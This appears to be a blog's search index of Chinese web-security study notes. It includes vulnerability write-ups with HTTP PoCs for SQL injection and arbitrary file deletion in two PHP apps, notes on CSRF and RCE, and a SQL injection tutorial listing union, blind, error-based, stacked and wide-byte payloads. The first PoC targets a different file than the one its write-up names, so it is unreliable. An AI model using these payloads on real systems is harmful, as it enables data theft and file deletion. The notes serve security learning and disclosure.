<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Air Cargo Management System v1.0存在SQL注入漏洞</title>
    <url>/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>Air Cargo Management System是一款航空货运管理系统。该系统包含不同的相关模块，例如交易。它有两个用户界面，即管理面板和公共端，Air Cargo Management System存在SQL注入漏洞，攻击者可以利用漏洞获取数据库数据权限等。</p>
<span id="more"></span>
<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>漏洞存在于\acms\classes\Users.php这个文件中，第 130行，网站通过post方式获取了id参数的值，然后在第132行拼接进数据库查询语句中，中间没有进行过滤，导致了漏洞的产生。</p>
<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152908077.png" alt="image-20220830152908077"></p>
<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><p>漏洞验证：</p>
<p>漏洞url: <a href="http://localhost/acms/classes/Users.php?f=delete_user">http://localhost/acms/classes/Users.php?f=delete_user</a></p>
<p>访问漏洞URL，使用抓包软件进行抓包</p>
<p>Select sleep(1)：</p>
<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152936163.png" alt="image-20220830152936163"></p>
<p>Select sleep(3)：</p>
<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152950292.png" alt="image-20220830152950292"></p>
<p>使用sqlmap跑出数据库命令：sqlmap -r 222.txt –risk 3 –level 4 –dbms mysql –dbs</p>
<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830153007912.png" alt="image-20220830153007912"></p>
<h1 id="四、PoC"><a href="#四、PoC" class="headerlink" title="四、PoC"></a>四、PoC</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/bsms/manage_product.php?id=1*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/bsms/?page=products</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=e2cd18647586f5b17de88fd20876023d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF 跨站请求伪造漏洞</title>
    <url>/2022/03/08/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CSRF跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击</p>
<span id="more"></span>
<p>攻击者盗用了用户的身份信息，以用户的名义发送恶意请求，对服务器来说这个请求是用户发起的，却完成了攻击者所期望的一个操作 XSS 利用站点内内的信任用户，盗取cookie CSRF通过伪装成受信任用户请求受信任的网站利用目标用户的合法身份，以目标的名义执行某些非法参数 利用条件：已经登录系统，用户访问URL 已存在的网站中让用户跳转</p>
<h2 id="CSRF漏洞防御方案"><a href="#CSRF漏洞防御方案" class="headerlink" title="CSRF漏洞防御方案"></a>CSRF漏洞防御方案</h2><p>1.当用户发送重要的请求时输入验证码<br>2.设置随机TOKEN —数据包的唯一值<br>3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4.设置验证码<br>5.限制请求方式只能为post</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>College Website Content Management System v1.0存在任意文件删除漏洞</title>
    <url>/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、-漏洞介绍"><a href="#一、-漏洞介绍" class="headerlink" title="一、 漏洞介绍"></a>一、 漏洞介绍</h1><p>College Website - Content Management System是一款校园管理CMS,可以对学生以及学生成绩进行管理，使用PHP语言编写，该CMS存在任意文件删除漏洞，可以删除服务器上的任意文件，该CMS存在任意文件删除漏洞，可以删除服务器上的任意文件。</p>
<span id="more"></span>
<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>漏洞存在于cwms\classes\Master.php这个文件中，第 24行，网站通过POST方式获取到要删除的文件的路径，第25行判断文件是否存在，然后第26行将文件删除，从获取文件位置到删除文件，没有对文件进行判断，导致用户可以删除任何文件。</p>
<p><img src="https://ax-x.github.io/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/image-20220830153437575.png" alt="image-20220830153437575"></p>
<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><p>漏洞验证：</p>
<p>漏洞url：<a href="http://localhost/cwms/classes/Master.php?f=delete_img">http://localhost/cwms/classes/Master.php?f=delete_img</a></p>
<p>首先在网站根目录底下创建一个文件叫做test.txt.</p>
<p><img src="https://ax-x.github.io/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/image-20220830153516447.png" alt="image-20220830153516447"></p>
<p>进入网站后台，进入设置选项，选择一个图片进行删除。</p>
<p><img src="https://ax-x.github.io/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/image-20220830153527976.png" alt="image-20220830153527976"></p>
<p><img src="https://ax-x.github.io/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/image-20220830153538981.png" alt="image-20220830153538981"></p>
<p>抓包，替换删除的文件路径为刚才创建的test.txt的文件路径，发包，删除成功，漏洞存在。</p>
<p><img src="https://ax-x.github.io/2022/03/08/College-Website-Content-Management-System-v1-0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/image-20220830153548358.png" alt="image-20220830153548358"></p>
<h1 id="四、PoC"><a href="#四、PoC" class="headerlink" title="四、PoC"></a>四、PoC</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cwms/classes/Master.php?f=delete_img</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/cwms/admin/?page=sytem_info</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=e2cd18647586f5b17de88fd20876023d</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">path</span>=%<span class="number">2</span>Fopt%<span class="number">2</span>Flampp%<span class="number">2</span>Fhtdocs%<span class="number">2</span>Ftest.txt</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>First Blog</title>
    <url>/2022/01/01/First%20Blog/</url>
    <content><![CDATA[<p>Welcome to my blog! I’m glad to make friends with you. If you can browse my website, I will be grateful. In the future, I will upload my records and learning contents here. I hope the boss will take me with me！</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE漏洞</title>
    <url>/2022/03/08/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>RCE漏洞是对命令执行/代码执行类漏洞的统称。这类漏洞因为可以通过网络远程执行命令或代码，可以直接获取一定权限，会造成较严重的影响，因此属于较高危的一类漏洞</p>
<span id="more"></span>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">由于系统开发时使用了特殊函数，能够将传输进来的数据当作是操作系统命令去执行， 攻击者将注入的语句更改为系统命令作为操作系统命令执行，仅当Web应用程序代码包含操作系统调用并且调用中使用了用户输入时，才可能进行命令攻击。</span><br></pre></td></tr></table></figure>

<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">代码注入攻击与命令注入攻击不同。因为需求设计，后台有时候需要把用户的输入作为代码的一部分进行执行,也就造成了代码执行漏洞。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">任何外部输入都可以进行验证：文本字段，列表框，单选按钮，复选框，cookie，HTTP头数据，HTTP <span class="built_in">post</span>数据，隐藏字段，参数名称和参数值</span><br></pre></td></tr></table></figure>

<h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">    system()<span class="comment">//执行外部程序，并且显示输出</span></span><br><span class="line">    exec()<span class="comment">//执行一个外部程序</span></span><br><span class="line">    shell_exec()<span class="comment">//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span></span><br><span class="line">    passthru()<span class="comment">//执行外部程序并且显示原始输出</span></span><br><span class="line">    pcntl_exec()<span class="comment">//在当前进程空间执行指定程序</span></span><br><span class="line">    popen()<span class="comment">//打开进程文件指针</span></span><br><span class="line">    proc_open()<span class="comment">//执行一个命令，并且打开用来输入/输出的文件指针</span></span><br><span class="line"><span class="comment">#代码执行</span></span><br><span class="line">    <span class="keyword">eval</span>()<span class="comment">//把字符串作为PHP代码执行</span></span><br><span class="line">    assert()<span class="comment">//检查一个断言是否为 FALSE，可用来执行代码</span></span><br><span class="line">    preg_replace()<span class="comment">//执行一个正则表达式的搜索和替换</span></span><br><span class="line">    call_user_func()<span class="comment">//把第一个参数作为回调函数调用</span></span><br><span class="line">    call_user_func_array()<span class="comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">    array_map()<span class="comment">//为数组的每个元素应用回调函数</span></span><br></pre></td></tr></table></figure>

<h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">java.lang.<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime(.<span class="params">exec</span>(<span class="params">command</span>)</span>）Java中没有类似php中eval 函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">    system()执行系统指令</span><br><span class="line">    popen()popen()方法用于从一个命令打开一个管道</span><br><span class="line">    subprocess.call执行由参数提供的命令</span><br><span class="line">    spawn 执行命令</span><br><span class="line"><span class="comment">#代码执行</span></span><br><span class="line">    <span class="built_in">exec</span>(string)<span class="comment"># Python代码的动态执行</span></span><br><span class="line">    <span class="built_in">eval</span>(string)<span class="comment"># 返回表达式或代码对象的值</span></span><br><span class="line">    execfile(string)<span class="comment"># 从一个文件中读取和执行Python脚本</span></span><br><span class="line">    <span class="built_in">input</span>(string)Python2.x 中 <span class="built_in">input</span>() 相等于 <span class="built_in">eval</span>(raw_input(prompt)) ，用来获取控制台的输入</span><br><span class="line">    <span class="built_in">compile</span>(string)<span class="comment"># 将源字符串编译为可执行对象</span></span><br></pre></td></tr></table></figure>

<h2 id="常见注入（利用）方式"><a href="#常见注入（利用）方式" class="headerlink" title="常见注入（利用）方式"></a>常见注入（利用）方式</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">system</span>(<span class="string">&quot;$arg&quot;</span>);   可控点直接是待执行的程序如果我们能直接控制$arg，那么就能执行执行任意命令了。</span><br><span class="line"><span class="number">2</span>、<span class="keyword">system</span>(<span class="string">&quot;/bin/prog $arg&quot;</span>);<span class="regexp">//</span>可控点是传入程序的整个参数我们能够控制的点是程序的整个参数，我们可以直接用&amp;&amp; || 或 | 等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。</span><br><span class="line"><span class="number">3</span>、<span class="keyword">system</span>(<span class="string">&quot;/bin/prog -p $arg&quot;</span>);<span class="regexp">//</span>可控点是传入程序的某个参数的值（无引号包裹）我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。</span><br><span class="line"><span class="number">4</span>、<span class="keyword">system</span>(<span class="string">&quot;/bin/prog --p=\&quot;$arg\&quot;&quot;</span>);<span class="regexp">//</span>可控点是传入程序的某个参数的值（有双引号包裹）这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell 环境下双引号中间的变量也是可以被解析的，我们可以在双引号内利用反引号执行任意命令 id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2022/01/16/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sql注入是什么？"><a href="#sql注入是什么？" class="headerlink" title="sql注入是什么？"></a>sql注入是什么？</h1><ul>
<li>web应用对用户输入数据的合法性没有判断或过滤不严，sql语句中的变量是可控的，导致攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<span id="more"></span></li>
</ul>
<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ul>
<li>对用户输入，传递的数据没有进行进一步的过滤，对执行的数据库语句没有进行过滤防护而导致，攻击者能够从输入的数据当中插入其他的数据库语句达到获取信息的效果。</li>
</ul>
<h1 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h1><ul>
<li><p>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息</p>
</li>
<li><p>绕过认证，列如绕过验证登录网站后台。</p>
</li>
<li><p>注入可以借助数据库的存储过程进行提权等操作</p>
</li>
</ul>
<h1 id="恶意用户利用SQL注入可以做到"><a href="#恶意用户利用SQL注入可以做到" class="headerlink" title="恶意用户利用SQL注入可以做到"></a>恶意用户利用SQL注入可以做到</h1><ul>
<li><p>1、可读取数据库中的库和表</p>
</li>
<li><p>2、可执行系统命令</p>
</li>
<li><p>3、可以修改任意文件</p>
</li>
<li><p>4、可以安装木马后门</p>
</li>
</ul>
<h1 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h1><h2 id="一、参数类型分类"><a href="#一、参数类型分类" class="headerlink" title="一、参数类型分类"></a>一、参数类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><ul>
<li>输入参数为整型时，如Id、年龄和页码等；</li>
</ul>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><ul>
<li>输入参数为字符串型时，如姓名、职业、住址等；</li>
</ul>
<p>两者最大的区别：字符型注入一般要使用单双引号进行闭合，而数字型注入则不需要；</p>
<h2 id="二、数据提交的方式来分类"><a href="#二、数据提交的方式来分类" class="headerlink" title="二、数据提交的方式来分类"></a>二、数据提交的方式来分类</h2><h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><ul>
<li>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</li>
</ul>
<h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><ul>
<li>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</li>
</ul>
<h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><ul>
<li>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</li>
</ul>
<h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><ul>
<li>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</li>
</ul>
<h2 id="三、按照执行效果来分类"><a href="#三、按照执行效果来分类" class="headerlink" title="三、按照执行效果来分类"></a>三、按照执行效果来分类</h2><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><ul>
<li>即可以根据返回页面判断条件真假的注入。</li>
</ul>
<h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><ul>
<li>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
</ul>
<h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><ul>
<li><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<ul>
<li><p>单引号</p>
</li>
<li><p>双引号</p>
</li>
<li><p>基于数字型注入</p>
</li>
</ul>
</li>
</ul>
<h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><ul>
<li>可以使用union的情况下的注入。</li>
</ul>
<h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><ul>
<li>可以同时执行多条语句的执行时的注入。</li>
</ul>
<h3 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h3><ul>
<li>宽字节注入原理即是利用编码转换，将服务器端强制添加的本来用于转义的\符号吃掉，从而能使攻击者输入的引号起到闭合作用，以至于可以进行SQL注入。</li>
</ul>
<p>宽字节介绍</p>
<ul>
<li>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。而我们的网站开发一般使用的是utf-8的编码，个别会使用gbk，而UTF-8是用的ASCII编码，由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。而字符与字符集的关系是字符是组成字符集的基本单位。对字符赋予一个数值来确定这个字符在该字符集中的位置。一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。 gbk 首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），所以使用宽字节能够覆盖转移符号对应的编码。</li>
</ul>
<h1 id="各个类型的注入简介"><a href="#各个类型的注入简介" class="headerlink" title="各个类型的注入简介"></a>各个类型的注入简介</h1><ul>
<li><h2 id="最基础的注入-union注入攻击"><a href="#最基础的注入-union注入攻击" class="headerlink" title="最基础的注入-union注入攻击"></a>最基础的注入-union注入攻击</h2><ul>
<li><p>判断是get型还是post型注入；</p>
</li>
<li><p>找到正确的闭合规则；order by 查询字段数；</p>
</li>
<li><p>union select 1,2…..查看显示位是第几位，没有的话就试试把id=1的显示位让出来，让其等于id=-1；第二、三位显示出来了，那么即可在这两个位置写入sql语句；</p>
</li>
<li><p>查询当前数据库,当前mysql用户 union select 1,user(),database()；</p>
</li>
<li><p>查询当前数据库里面的表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”data_name”;</p>
</li>
<li><p>查询到敏感表名user，继续查询表里面的字段 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”user”;</p>
</li>
<li><p>查询字段，例如“id”、”passwd”的内容 union select 1,id,passwd from user;</p>
</li>
<li><p>拿到用户、密码登入后台。</p>
</li>
</ul>
</li>
<li><h2 id="Boolean注入攻击-布尔盲注"><a href="#Boolean注入攻击-布尔盲注" class="headerlink" title="Boolean注入攻击-布尔盲注"></a>Boolean注入攻击-布尔盲注</h2><ul>
<li><p>查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；</p>
</li>
<li><p>由页面的两种不同返回的状态来判定我们的闭合规则；</p>
</li>
<li><p>为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态找到闭合规则后，我们在闭合规则里面  and 1=1 和 and 1=2 测试一下，看看最后返回是不是两种状态；</p>
</li>
<li><p>布尔盲注要用到length()和substr()语句，用两种状态来猜解数据库、表名等的长度和正确字母；</p>
</li>
<li><p>先用 and length(database())&gt;2 来猜数据库的长度，使用的是二分法；</p>
</li>
<li><p>再用 and substr(database(),1,1)=’t’ 来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；</p>
</li>
<li><p>and substr(database(),2,1)=’t’ 代表当前数据库的第二个字母；</p>
</li>
<li><p>最后结合长度，成功的将数据库猜解出来；</p>
</li>
<li><p>后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。</p>
</li>
</ul>
</li>
<li><h2 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h2><ul>
<li><p>只要注入点有sql报错信息，那么就可以使用报错注入；</p>
</li>
<li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p>
</li>
<li><p>updatexml报错获取当前数据库：and updatexml(1,concat(0x7e,(select database()),0x7e),1)</p>
</li>
<li><p>floor报错获取当前数据库：and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)</p>
</li>
<li><p>两种方式都可行，如果第一个不行就试试第二个</p>
</li>
<li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p>
</li>
<li><p>只不过这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p>
</li>
</ul>
</li>
<li><h2 id="时间注入攻击-延时盲注"><a href="#时间注入攻击-延时盲注" class="headerlink" title="时间注入攻击-延时盲注"></a>时间注入攻击-延时盲注</h2><ul>
<li><p>没有明确的现象，不管是对是错都返回一个状态；</p>
</li>
<li><p>但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；</p>
</li>
<li><p>我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；</p>
</li>
<li><p>同样的找到正确的闭合规则，当然，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；</p>
</li>
<li><p>时间盲注配合着  if(A,B,C)  语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；</p>
</li>
<li><p>那么判断当前数据库名的长度的语句为：if (length(database())&gt;1,sleep(5),1)就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是不延时)，由此来推出数据库长度。</p>
</li>
<li><p>判断当前数据库名的第一个和第二个字母的语句：</p>
</li>
<li><p>if(substr(database(),1,1)=’s’,sleep(5),1)</p>
</li>
<li><p>if(substr(database(),2,1)=’s’,sleep(5),1)</p>
</li>
<li><p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p>
</li>
<li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p>
</li>
</ul>
</li>
<li><h2 id="堆叠查询注入攻击"><a href="#堆叠查询注入攻击" class="headerlink" title="堆叠查询注入攻击"></a>堆叠查询注入攻击</h2><ul>
<li><p>可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；</p>
</li>
<li><p>同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；</p>
</li>
<li><p>类似与下面在分号后面可执行新的语句：</p>
</li>
<li><p>;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)=’r’,sleep(3),1)</p>
</li>
<li><p>堆叠的;分号后可以执行新的sql语句，因此在知道网站根目录的情况下可以直接写日志拿shell。</p>
</li>
</ul>
</li>
<li><h2 id="二次注入攻击"><a href="#二次注入攻击" class="headerlink" title="二次注入攻击"></a>二次注入攻击</h2><ul>
<li><p>二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</p>
</li>
<li><p>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</p>
</li>
<li><p>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</p>
</li>
<li><p>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</p>
</li>
<li><p>后面就是union注入攻击的常规操作。</p>
</li>
</ul>
</li>
<li><h2 id="宽字节注入攻击"><a href="#宽字节注入攻击" class="headerlink" title="宽字节注入攻击"></a>宽字节注入攻击</h2><ul>
<li><p>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</p>
</li>
<li><p>一般情况下，此处就不存在sql注入漏洞的；但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</p>
</li>
<li><p>宽字节的格式是在地址后先加一个  %df  ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</p>
</li>
<li><p>因此构造闭合规则时，在单引号前面加上  %df 就行了；</p>
</li>
<li><p>之后在闭合规则中写入同union注入的一些查询语句就行了；</p>
</li>
</ul>
</li>
